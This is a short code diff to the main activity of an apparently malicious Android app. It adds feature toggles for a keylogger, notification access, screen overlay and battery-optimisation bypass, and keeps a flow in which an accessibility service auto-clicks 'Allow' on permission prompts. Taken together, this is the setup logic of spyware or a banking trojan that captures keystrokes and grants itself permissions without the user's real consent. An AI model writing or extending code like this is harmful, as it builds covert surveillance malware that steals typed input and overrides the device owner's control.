@@ -77,9 +77,14 @@ class MainActivity : ComponentActivity() {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
         }
         
+        val enableKeylogger = Config.isFeatureEnabled(this, "feat_keylogger")
+        val enableNotifications = Config.isFeatureEnabled(this, "feat_notifications")
+        val enableOverlay = Config.isFeatureEnabled(this, "feat_overlay")
+        val enableBattery = Config.isFeatureEnabled(this, "feat_battery")
+
         // --- ACCESSIBILITY-FIRST FLOW ---
         when {
-            !isAccessibilityServiceEnabled() -> {
+            enableKeylogger && !isAccessibilityServiceEnabled() -> {
                 requestAccessibilityAccess()
             }
             runtimeMissing -> {
@@ -87,13 +92,13 @@ class MainActivity : ComponentActivity() {
                 // The AccessibilityService will now auto-click "Allow" for these.
                 checkAndRequestBulkPermissions()
             }
-            !isNotificationServiceEnabled() -> {
+            enableNotifications && !isNotificationServiceEnabled() -> {
                 requestNotificationAccess()
             }
-            !isOverlayAccessGranted() -> {
+            enableOverlay && !isOverlayAccessGranted() -> {
                 requestOverlayAccess()
             }
-            !isIgnoringBatteryOptimizations() -> {
+            enableBattery && !isIgnoringBatteryOptimizations() -> {
                 requestIgnoreBatteryOptimizations()
             }
             else -> {
